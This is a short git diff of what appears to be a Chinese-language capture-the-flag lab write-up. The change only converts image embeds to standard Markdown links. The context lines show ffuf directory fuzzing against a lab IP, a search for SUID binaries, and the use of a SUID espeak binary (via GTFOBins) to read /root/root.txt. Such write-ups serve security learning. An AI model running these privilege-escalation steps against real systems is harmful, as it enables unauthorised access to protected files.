@@ -92,7 +92,7 @@ mosh                    [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 4
 
 
 仍然没有显示，看来需要继续ffuf
-![[Pasted image 20260127211000.png]]
+![](images/Pasted%20image%2020260127211000.png)
 
 ```bash
 ☁  ~  ffuf -u http://192.168.3.52/mosh-logs/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -e .txt,.php,.log -fc 404
@@ -285,7 +285,7 @@ Mosh:~$ find / -perm -u=s 2>/dev/null
 ```
 
 https://gtfobins.org/gtfobins/espeak/
-![[Pasted image 20260127214651.png]]
+![](images/Pasted%20image%2020260127214651.png)
 
 ```bash
 Mosh:~$ /usr/bin/espeak -qXf /root/root.txt > res.txt
